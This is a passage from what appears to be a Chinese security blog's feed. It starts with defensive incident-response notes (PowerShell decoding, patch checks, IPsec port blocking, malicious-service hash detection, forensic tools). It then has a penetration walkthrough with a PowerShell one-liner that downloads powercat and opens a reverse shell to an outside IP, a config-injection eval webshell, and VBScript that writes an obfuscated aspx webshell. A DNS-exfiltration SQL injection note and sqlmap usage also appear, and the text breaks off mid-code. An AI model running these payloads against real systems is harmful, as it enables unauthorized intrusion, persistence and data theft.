src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/1550764772.png" alt><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/2955844708.png" alt="111.png"></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/1129965653.png" alt></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/4279610697.png" alt></p><h3 id="0x04-powershell解码"><a href="#0x04-powershell解码" class="headerlink" title="0x04 powershell解码"></a>0x04 powershell解码</h3><blockquote><p>需求：遇到powershell -enc 方式执行需要解码</p></blockquote><p><strong>解码</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(<span class="string">"UnicodeBase64编码放到此处"</span>))</span><br></pre></td></tr></table></figure><p><strong>编码</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(<span class="string">"任意字符串放此处"</span>))</span><br></pre></td></tr></table></figure><p><strong>例图：</strong></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/738368265.png" alt></p><h3 id="0x05-计划任务相关"><a href="#0x05-计划任务相关" class="headerlink" title="0x05 计划任务相关"></a>0x05 计划任务相关</h3><p>1、 查看计划任务列表</p><p><code>schtasks /query /fo LIST</code></p><p>2、查看计划任务详情</p><p><code>schtasks /query /v /tn &quot;\Microsoft\windows\Bluetooths&quot; /fo list</code></p><p><strong>例图：</strong></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/2586815607.png" alt></p><h3 id="0x06-判断是否有打永恒之蓝补丁"><a href="#0x06-判断是否有打永恒之蓝补丁" class="headerlink" title="0x06 判断是否有打永恒之蓝补丁"></a>0x06 判断是否有打永恒之蓝补丁</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[array]<span class="variable">$hotfixid</span>=<span class="built_in">get-hotfix</span> -id KB4012606,KB3210720,KB3210721,KB4012598,KB4012212,KB4012215,KB4012213,KB4012216,KB4012214,KB4012217,KB4013198,KB4015549 -ErrorAction <span class="number">0</span>  | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.HotFixID&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$hotfixid</span> <span class="nomarkup">-eq</span> <span class="literal">$null</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="built_in">Write-host</span> <span class="string">"[-] 危险: MS17010B补丁未打，易遭永恒之蓝攻击!"</span> -ForegroundColor Red</span><br><span class="line"> <span class="built_in">Write-host</span> <span class="string">"补丁参考1: https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010"</span> -ForegroundColor DarkYellow</span><br><span class="line"> <span class="built_in">Write-host</span> <span class="string">"补丁参考2: https://b.360.cn/other/onionwormfix"</span> -ForegroundColor DarkYellow</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="built_in">Write-Host</span> <span class="string">"[+] ms17010 补丁以打"</span>  -ForegroundColor Green</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/1926447350.png" alt></p><h3 id="0x07-防火墙及ipsec相关操作"><a href="#0x07-防火墙及ipsec相关操作" class="headerlink" title="0x07 防火墙及ipsec相关操作"></a>0x07 防火墙及ipsec相关操作</h3><p><strong>windows防火墙允许445入站</strong></p><p><code>netsh advfirewall set allprofiles state on netsh advfirewall firewall add rule name=&quot;allow tcp 445&quot; dir=in protocol=tcp localport=445 action=allow</code> #允许445</p><p><strong>ipsec 禁止139、445、135端口</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">netsh ipsec static add policy name=tomcatgo</span><br><span class="line">netsh ipsec static add filterlist name=Filter1</span><br><span class="line">netsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=135 protocol=TCP mirrored = yes</span><br><span class="line">echo “135端口已经关闭”</span><br><span class="line">netsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=139 protocol=TCP mirrored = yes</span><br><span class="line">echo “139端口已经关闭”</span><br><span class="line">netsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=445 protocol=TCP mirrored = yes</span><br><span class="line">echo “445端口已经关闭”</span><br><span class="line"></span><br><span class="line">netsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=135 protocol=UDP mirrored = yes</span><br><span class="line">netsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=139 protocol=UDP mirrored = yes</span><br><span class="line">netsh ipsec static add filter filterlist=Filter1 srcaddr=any dstaddr=Me dstport=445 protocol=UDP mirrored = yes</span><br><span class="line"></span><br><span class="line">netsh ipsec static add filteraction name=Filteraction1 action=block</span><br><span class="line">netsh ipsec static add rule name=Rule1 policy=tomcatgo filterlist=Filter1 filteraction=FilteraAtion1</span><br><span class="line">netsh ipsec static set policy name=tomcatgo assign=y</span><br></pre></td></tr></table></figure><h3 id="0x08-获取进程md5"><a href="#0x08-获取进程md5" class="headerlink" title="0x08 获取进程md5"></a>0x08 获取进程md5</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get-process</span> | where path <span class="nomarkup">-ne</span> <span class="literal">$null</span> | %&#123;<span class="built_in">Get-FileHash</span> <span class="variable">$_</span>.path -Algorithm md5&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/3289779667.png" alt></p><h3 id="0x09-恶意服务检测"><a href="#0x09-恶意服务检测" class="headerlink" title="0x09 恶意服务检测"></a>0x09 恶意服务检测</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> win32_service |?&#123; <span class="variable">$_</span>.name <span class="nomarkup">-eq</span> <span class="string">'svchost.exe'</span> -and <span class="variable">$_</span>.PathName <span class="nomarkup">-notlike</span>  <span class="string">'*C:\WINDOWS\System32\svchost.exe*'</span> -and <span class="variable">$_</span>.PathName <span class="nomarkup">-not</span></span><br><span class="line">like <span class="string">'*c:\Windows\SysWOW64\svchost.exe*'</span>&#125; | select Name, DisplayName, State, PathName</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> win32_service | ?&#123;<span class="variable">$_</span>.PathName <span class="nomarkup">-like</span> <span class="string">'*svchost.exe*'</span>&#125; | select Name, DisplayName, @&#123;Name=<span class="string">"Path"</span>; Expression=&#123;<span class="variable">$_</span>.PathName.split(<span class="string">'</span></span><br><span class="line"><span class="string">'</span>)[<span class="number">0</span>]&#125;&#125; | <span class="built_in">Format-List</span></span><br></pre></td></tr></table></figure><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/494053681.png" alt></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/550706275.png" alt></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> win32_service |select name, @&#123;N=<span class="string">'FileHash'</span>;E=&#123;(<span class="built_in">Get-FileHash</span> <span class="variable">$_</span>.pathname -Algorithm md5 -ErrorAction <span class="number">0</span>).hash&#125;&#125;,pa</span><br><span class="line">thname| %&#123;<span class="keyword">if</span>(<span class="variable">$_</span>.filehash <span class="nomarkup">-eq</span> <span class="string">'51D3A1E2285E2E931A553281BBA10E81'</span>)&#123;<span class="built_in">Write-Host</span> 恶意服务:  <span class="variable">$_</span>.name 执行路径: <span class="variable">$_</span>.pathname -ForegroundColor Red&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>检测多个hash值</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Get-md5 &#123;</span><br><span class="line">  <span class="keyword">Param</span>(<span class="variable">$path</span>)</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">Test-Path</span> <span class="variable">$path</span> -PathType Leaf )&#123;</span><br><span class="line">  <span class="variable">$md5file</span>=certutil -hashfile <span class="string">"<span class="variable">$path</span>"</span> MD5</span><br><span class="line">  [string]<span class="variable">$hash</span>=<span class="variable">$md5file</span> <span class="nomarkup">-match</span> <span class="string">"^[a-f0-9]&#123;32&#125;$"</span></span><br><span class="line">  <span class="variable">$retVal</span> = <span class="built_in">New-Object</span> -TypeName psobject -Property @&#123;</span><br><span class="line">                    Path = <span class="variable">$path</span></span><br><span class="line">                    Hash = <span class="variable">$hash</span>.ToUpper()</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$retVal</span></span><br><span class="line"></span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[array]<span class="variable">$services_md5</span>=<span class="built_in">Get-WmiObject</span> win32_service  |?&#123; <span class="variable">$_</span>.PathName <span class="nomarkup">-notlike</span>  <span class="string">'*C:\WINDOWS\System32\svchost*'</span> -and <span class="variable">$_</span>.PathName <span class="nomarkup">-notlike</span> <span class="string">'*c:\Windows\SysWOW64\svchost*'</span>&#125;|select  name, @&#123;N=<span class="string">'FileHash'</span>;E=&#123;(Get-md5 <span class="variable">$_</span>.pathname.replace(<span class="string">'"'</span>,<span class="string">''</span>) ).hash&#125;&#125;,pathname </span><br><span class="line"><span class="comment">#$services_md5 |Where &#123;$_.FileHash -eq "6983F7001DE10F4D19FC2D794C3EB534" -or  $_.FileHash -eq "59B18D6146A2AA066F661599C496090D" -or  $_.FileHash -eq "CCE36235A525858EB55070847296C4C8" -or  $_.FileHash -eq "9911858E9BEC100CCF6D8134915103EC" -or  $_.FileHash -eq "74E2A43B2B7C6E258B3A3FC2516C1235" -or  $_.FileHash -eq "D4E2EBCF92CF1B2E759FF7CE1F5688CA" -or  $_.FileHash -eq "FB89D40E24F5FF55228C38B2B07B2E77" -or  $_.FileHash -eq "637BF46077AD083659D3B96A010F38FE"&#125;</span></span><br><span class="line"><span class="variable">$services_md5</span> |Where &#123;<span class="variable">$_</span>.FileHash <span class="nomarkup">-eq</span> <span class="string">'00A8C2DD875BC4B458CBFED72AAF45F4'</span> -or <span class="variable">$_</span>.FileHash <span class="nomarkup">-eq</span> <span class="string">'498A07B121D7A3815563DC15AC306EBD'</span> -or <span class="variable">$_</span>.FileHash <span class="nomarkup">-eq</span> <span class="string">'B4DAABEBBF16A7C8871209D946E917F3'</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/972269086.png" alt></p><h3 id="0x10-常用wmi命令"><a href="#0x10-常用wmi命令" class="headerlink" title="0x10 常用wmi命令"></a>0x10 常用wmi命令</h3><p><strong>1、查看服务详情</strong></p><p><code>wmic service get name,pathname,processid,startname,status,state /value</code></p><p><strong>例图：</strong></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/3420416264.png" alt></p><p><strong>2、查看进程详情</strong></p><p><code>wmic process get CreationDate,name,processid,commandline,ExecutablePath /value</code></p><p>图例：</p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/2650766313.png" alt></p><p><strong>3、查看补丁</strong></p><p><code>wmic qfe get hotfixid</code></p><p><strong>4、查看启动项</strong></p><p><code>wmic startup</code></p><p>图例：</p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images/2239360247.png" alt><br><strong>5、安装软件列表</strong></p><p><code>wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_Product get name /FORMAT:table</code></p><p><strong>6、获取快捷方式列表</strong></p><p><code>wmic PATH Win32_ShortcutFile get name</code></p><p><strong>7、获取dns缓存记录</strong></p><blockquote><p>可通过dns 缓存记录中查看是否有恶意请求<br><code>ipconfig /displaydns</code></p></blockquote><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><blockquote><p>更详细快捷的查杀建议使用<strong>pchunter</strong> <strong>火绒剑</strong> <strong>auturuns</strong> 等安全辅助工具</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>应急分析取证工具篇</title>
      <link href="/2019/01/26/Volatility-tools/"/>
      <url>/2019/01/26/Volatility-tools/</url>
      
        <content type="html"><![CDATA[<blockquote><p>应急响应笔记持续更新中，大部分内容都是工作上遇到的，欢迎讨论</p></blockquote><h3 id="1-共享访问监控"><a href="#1-共享访问监控" class="headerlink" title="1. 共享访问监控"></a>1. 共享访问监控</h3><ul><li>功能：查看连接</li><li>场景：某机器提供共享，共享文件夹一直报毒，使用该工具可快速知道哪些机器访问了该机器共享</li><li>下载地址：<a href="http://www.nirsoft.net/utils/networkopenedfiles-x64.zip" target="_blank" rel="noopener">networkopenedfiles-x64.zip</a></li></ul><p><strong>使用效果如下：</strong><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/cf74d7647803cf1df3e9681447abdb5a.png" alt="2019-07-29-02-42-37"></p><p><strong>设置存储日志：</strong><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/4ae41839c00bf802df062cc0b8f888ea.png" alt="2019-07-29-02-42-58"></p><blockquote><p>ps:后来发现windows 自带共享会话监视功能</p></blockquote><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/492f6a446ac1ccdbb1bb9785f3e7524a.png" alt="2019-07-29-02-43-27"><br><strong>其它:</strong><br>组策略中开启<strong>审核对象访问</strong>,并对<strong>共享目录</strong>中添加对应的审核账号的写入属性<strong>成功</strong>和<strong>删除</strong>的审核,即可在操作系统安全日志中看到相关记录<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/f5951b7fa73a21e77638f9c64e473c3b.png" alt="2019-07-29-02-39-55"></p><h3 id="2-wifi使用记录"><a href="#2-wifi使用记录" class="headerlink" title="2. wifi使用记录"></a>2. wifi使用记录</h3><ul><li>功能：查看使用wifi历史记录</li><li>场景：看该电脑是否有连接过其它无线网络，以证明非本内网络导致感染</li><li>下载地址：<a href="http://www.nirsoft.net/utils/wifihistoryview.zip" target="_blank" rel="noopener">wifihistoryview</a></li></ul><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/1e444bd284979447c123f80e7945693c.png" alt="2019-07-29-02-43-57"></p><h3 id="3-usb使用记录"><a href="#3-usb使用记录" class="headerlink" title="3. usb使用记录"></a>3. usb使用记录</h3><ul><li>功能：查看插入或拔出系统的任何USB设备的详细信息。</li><li>场景：查看是否为u盘传输导致感染</li><li>下载地址：<a href="https://www.nirsoft.net/utils/usblogview.zip" target="_blank" rel="noopener">usblogview.zip</a></li></ul><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/83dbf2e863f4b81328df571368e1e3de.png" alt="2019-07-29-02-44-19"></p><h3 id="4-内存取证"><a href="#4-内存取证" class="headerlink" title="4. 内存取证"></a>4. 内存取证</h3><ul><li>内存镜像工具 DumpIt.exe</li><li>介绍：DumpIt 是一款绿色免安装的 windows 内存镜像取证工具。利用它我们可以轻松地将一个系统的完整内存镜像下来，并用于后续的调查取证工作。</li></ul><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/57b13d67c449a4294454557d7002fed3.png" alt="突破来源:即刻安全"></p><blockquote><p>下载地址 <a href="https://my.comae.io/tools" target="_blank" rel="noopener">Comae-Toolkit</a></p><ul><li><a href="http://www.secist.com/archives/2076.html" target="_blank" rel="noopener">http://www.secist.com/archives/2076.html</a></li><li><a href="http://blog.md5.red/?p=578" target="_blank" rel="noopener">http://blog.md5.red/?p=578</a></li></ul></blockquote><ul><li>raw 内存取证</li><li>github:<a href="https://github.com/volatilityfoundation" target="_blank" rel="noopener">https://github.com/volatilityfoundation</a></li><li>exe下载:<a href="https://www.volatilityfoundation.org/releases" target="_blank" rel="noopener">https://www.volatilityfoundation.org/releases</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 pslist</span><br><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 psxview</span><br></pre></td></tr></table></figure><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/ee03222c2bccbf497ae37f7173ec6a53.png" alt="2019-07-29-02-45-40"></p><ul><li>参考:<a href="https://xz.aliyun.com/t/2497" target="_blank" rel="noopener">https://xz.aliyun.com/t/2497</a></li></ul><h3 id="5-Ghost-镜像浏览"><a href="#5-Ghost-镜像浏览" class="headerlink" title="5. Ghost 镜像浏览"></a>5. Ghost 镜像浏览</h3><ul><li><p>ghost-explorer </p></li><li><p>系统比较复杂不便现场分析，可备份ghost 文件，后面用ghost-explorer 进行提取相关文件</p></li><li><p>背景：一次应急过程，客户铲掉了受感染系统，而这台服务器刚好是关键线索。幸好客户前面做了ghost备份。后面通过ghost-explorer  提取ghost 镜像注册表、日志信息成功溯源。</p></li><li><p>官网 <a href="https://www.symantec.com/connect/blogs/ghost-explorer" target="_blank" rel="noopener">https://www.symantec.com/connect/blogs/ghost-explorer</a> </p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从注入到webshell</title>
      <link href="/2019/01/06/sql-pentest/"/>
      <url>/2019/01/06/sql-pentest/</url>
      
        <content type="html"><![CDATA[<blockquote><p>背景：一朋友渗透测试中遇到一个注入点可执行命令，但无法突破写shell卡住,<strong>mssql</strong>注入<strong>dba</strong>权限<strong>whoami</strong>为<strong>network</strong>权限木马暂时未上</p></blockquote><p>注入点: <code>https://********.com/member/news.asp?ID=6666</code></p><h3 id="判断是否站库分离"><a href="#判断是否站库分离" class="headerlink" title="判断是否站库分离"></a>判断是否站库分离</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @@servername<span class="string">`</span></span><br><span class="line"><span class="string">select host_name()`</span></span><br></pre></td></tr></table></figure><p>发现站库是同服务器</p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/87f95d1b0395eb09b9d6dae8a3d1c799.png" alt="2019-07-30-05-03-10"></p><p>直接sqlshell执行命令返回太慢，且容易产生大量不必要日志，web目录不可写，所以这里使用powershell反弹shell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 123.123.123.123 -p 443 -e cmd</span></span><br></pre></td></tr></table></figure><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/fa0d3207b6d655871c7072fa68b27f0d.png" alt="2019-07-30-05-22-18"></p><p>web目录不可写<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/669c6f379359eccb94d33e5f81bb8218.png" alt="2019-07-30-06-24-51"></p><p>发现有php进程，看php进程是否以system权限启动，如果为system权限启动并且对应的web目录可写，就直接省去了提权<br><code>tasklist /fi &quot;IMAGENAME eq php.exe&quot; /v</code><br>执行发现并不是高权限启动</p><p>发现eweb编辑器，且配置文件插入了常用iis可解析后缀<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/1a8a9527e98abd55d7e51ce3c700dcd3.png" alt="2019-07-30-05-17-51"></p><p>登录eweb编辑器发现没有开启asp上传相关组件，无法使用eweb编辑器进行上传任何文件，但是可以<strong>修改配置文件</strong>，也就是说并不是真正的不可写，修改配置文件调用的是<code>Adodb.Stream</code>，而通常上传代码为<code>Scripting.FileSystemObject</code> 组件<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/c6b742eef477112b137db0d1d2b43db8.png" alt="2019-07-30-06-23-01"><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/4ceb6c9c1cd81b7aa16739b50ff3c868.png" alt="2019-07-30-05-26-44"></p><p>查看<code>ewebeditor/admin/private.asp</code></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/1b92b362fb8b7daccf6fd9c4ba0d22be.png" alt="2019-07-30-06-16-39"></p><p>拿shell思路写config.asp配置文件<br><strong>修改写配置文件</strong><br>将密码修改为:<br><code>aaaaaaaaa&quot;:eval request(&quot;a&quot;)&#39;</code><br><strong>aaaaaaaaa</strong>为原本密码<br>成功连接webshell<br><code>https://********.com/ewebeditor/asp/config.asp</code></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/c4474d311ce034824c948d316a5c4b5b.png" alt="2019-07-30-06-20-52"></p><p>既然Adodb.Stream 可以修改配置文件，那么同样也可以用来上传文件，下图是eweb中写配置文件代码，我们可以直接抠出来用</p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/b454668b6fbb582f4a442fd903b52a40.png" alt="2019-07-30-06-35-07"></p><blockquote><p>菜刀执行自定义代码<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/d296bb33a190c6d775637d5108979f42.png" alt="2019-07-30-06-46-31"></p></blockquote><p>利用Adodb.Stream 写aspxshell</p><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> WriteFile(s_FileName, s_Text)</span><br><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line"><span class="built_in">Err</span>.Clear</span><br><span class="line"><span class="keyword">Dim</span> stm</span><br><span class="line"><span class="keyword">Set</span> stm = <span class="built_in">Server</span>.<span class="built_in">CreateObject</span>(<span class="string">"Adodb.Stream"</span>)</span><br><span class="line">stm.Type = <span class="number">2</span></span><br><span class="line">stm.mode = <span class="number">3</span></span><br><span class="line">stm.charset = <span class="string">"utf-8"</span></span><br><span class="line">stm.Open</span><br><span class="line">stm.WriteText s_Text</span><br><span class="line">stm.SaveToFile <span class="built_in">Server</span>.Mappath(s_FileName), <span class="number">2</span></span><br><span class="line">stm.flush</span><br><span class="line">stm.Close</span><br><span class="line"><span class="keyword">Set</span> stm = <span class="literal">Nothing</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">Err</span>.Number&lt;&gt;<span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line"><span class="built_in">Err</span>.Clear</span><br><span class="line"><span class="built_in">Response</span>.Write <span class="string">"&lt;br&gt;&lt;br&gt;Error: Write config file, reason:&lt;br&gt;1. You do not have write privileges for eWebEditor/asp/config.asp&lt;br&gt;2. Server have disabled Adodb.Stream Object"</span></span><br><span class="line"><span class="built_in">Response</span>.<span class="keyword">End</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line">aspxshell= <span class="string">"&lt;"</span>&amp;<span class="string">"%"</span>&amp;<span class="string">"@"</span>&amp;<span class="string">"Page Language"</span>&amp;<span class="string">"="</span>&amp;<span class="string">""</span><span class="string">""</span>&amp;<span class="string">"Jscript"</span>&amp;<span class="string">""</span><span class="string">""</span>&amp;<span class="string">"%"</span>&amp;<span class="string">"&gt;"</span>&amp;<span class="string">"&lt;"</span>&amp;<span class="string">"%"</span>&amp;<span class="string">"eval"</span>&amp;<span class="string">"("</span>&amp;<span class="string">"Request"</span>&amp;<span class="string">"."</span>&amp;<span class="string">"Item"</span>&amp;<span class="string">"["</span>&amp;<span class="string">""</span><span class="string">""</span>&amp;<span class="string">"pass"</span>&amp;<span class="string">""</span><span class="string">""</span>&amp;<span class="string">"]"</span>&amp;<span class="string">","</span>&amp;<span class="string">""</span><span class="string">""</span>&amp;<span class="string">"unsafe"</span>&amp;<span class="string">""</span><span class="string">""</span>&amp;<span class="string">")"</span>&amp;<span class="string">";"</span>&amp;<span class="string">"%"</span>&amp;<span class="string">"&gt;"</span></span><br><span class="line"><span class="keyword">Call</span> WriteFile(<span class="string">"../uploadfile/config.aspx"</span>, aspxshell)</span><br></pre></td></tr></table></figure><p>成功获得aspxshell：<br><code>https://********.com/ewebeditor/asp/config.aspx</code> <code>pass</code></p><p>这里为什么要用aspx shell呢？因为<code>.net</code>有可能继承users组权限，且不受<code>fso</code>(FileSystemObject)组件影响,当然也可以使用<strong>无fsoshell</strong></p><p>数据库反弹shell无法对web目录写文件原因下几个图片可以说明：<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/c9fd7a7adea2782bb6801de9e590428b.png" alt="2019-07-30-06-45-23"></p><p>数据库shell权限：<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/387cd9e0c565d0b74bc611d16133cb5b.png" alt="2019-07-30-06-38-05"></p><p>webshell 下权限<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/f2f953c2079630b0ee221b8c58b8bf5a.png" alt="2019-07-30-06-44-09"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DNS Log 杂记</title>
      <link href="/2018/09/19/DNSlog/"/>
      <url>/2018/09/19/DNSlog/</url>
      
        <content type="html"><![CDATA[<ol><li><p>public 能执行 xp_dirtree 函数 (可以用来dns 回显注入)</p></li><li><p>public 权限下不能列任何目录(网上很多文章说public能列)</p><a id="more"></a></li><li><p>mssql dns 回显注入： 网上教程说需要两个域名，实际一个域名就可以:) 配置域名： </p></li></ol><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images%2FDnslog.PNG" alt="domain"></p><p>条件：支持多语句执行  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> @host <span class="built_in">varchar</span>(<span class="number">1024</span>);</span><br><span class="line">  <span class="keyword">SELECT</span> @host=(<span class="keyword">SELECT</span> <span class="keyword">CURRENT_USER</span></span><br><span class="line">+<span class="string">'bind.google.com'</span>);</span><br><span class="line">  EXEC('master..xp_dirtree</span><br><span class="line">"\\'+@host+'\foobar$"');</span><br></pre></td></tr></table></figure><p>远程外网服务器监听： <code>./sqlmap/lib/request/dns.py</code> 即可有回显结果</p><ol start="4"><li>sqlmap 可直接利用dns 回显注入来突破鸡肋的延时注入</li></ol><p><code>sqlmap --dns-domain bind.google.com(你的域名)</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> dnslog sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取http信息小工具</title>
      <link href="/2018/09/19/httpinfo-tool/"/>
      <url>/2018/09/19/httpinfo-tool/</url>
      
        <content type="html"><![CDATA[<p>功能: 获取网站titele信息 服务器信息<br>批量的话结合 for 命令使用</p><a id="more"></a><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/images%2F7788811111.PNG" alt="hinfo"></p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 